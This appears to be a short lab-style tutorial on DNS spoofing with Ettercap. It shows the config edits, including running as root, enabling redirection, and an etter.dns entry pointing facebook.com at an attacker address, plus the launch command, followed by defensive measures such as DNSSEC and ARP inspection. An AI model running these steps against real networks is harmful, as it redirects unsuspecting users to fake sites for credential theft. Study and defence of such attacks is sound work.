# DNS Spoofing Attack

## What is DNS Spoofing?

DNS Spoofing (also known as DNS cache poisoning) is an attack where a
malicious actor redirects a victim's DNS requests to a fake or
unintended server. This can trick users into visiting fraudulent
websites instead of legitimate ones.

* **DHCP Server IP Address:** 192.168.1.1
* **Attacker IP Address:** 192.168.1.8

## How the Attack Works

1.  First edit the Ettercap configuration file.

     ```bash
     gedit /etc/ettercap/etter.conf 
     ```

2.  Change the UID and GID values at the top to make them say 0.

     ```bash
     ec_uid = 0
     ec_gid = 0 
     ```
  

3. Now scroll down until you find the heading that says Linux and under that remove both the # 
signs below where it is redir_command_on

4. Configure another ettercap file called etter.dns
     ```bash
     leafpad /etc/ettercap/etter.dns
     ```
5. Add the domain names you would like to redirect to your local server
     ```bash
     www.facebook.com A 192.168.1.8
     *.facebook.com A 192.168.1.8
     ```

6. Now open up ettercap and start the attack.
      ```bash
     ettercap -G
     ```


## What Happens to the Victim

-   The victim attempts to access a legitimate domain (e.g.,
    `facebook.com`).
-   Instead of being sent to the correct IP, DNS resolves it to the
    attacker's IP.
-   The victim unknowingly lands on a malicious server or fake website.

------------------------------------------------------------------------

## Defensive Measures

To protect against DNS spoofing attacks:

1.  **Use DNSSEC** -- Ensures authenticity of DNS responses.
2.  **Enable ARP Inspection / Dynamic ARP Inspection (DAI)** -- Prevents
    ARP poisoning on switches.
3.  **Deploy IDS/IPS Systems** -- Detects and blocks suspicious DNS and
    ARP traffic.
4.  **Use Encrypted DNS (DoH or DoT)** -- Protects DNS queries from
    tampering.
5.  **Monitor DNS Logs** -- Detect anomalies in query patterns and
    unexpected redirects.
6.  **Keep Systems Patched** -- Regularly update networking and
    DNS-related software.

------------------------------------------------------------------------

## Summary

DNS spoofing can be highly deceptive, redirecting users to malicious
websites even if they type the correct domain. Awareness, monitoring,
and the use of secure DNS mechanisms are critical to preventing such
attacks.
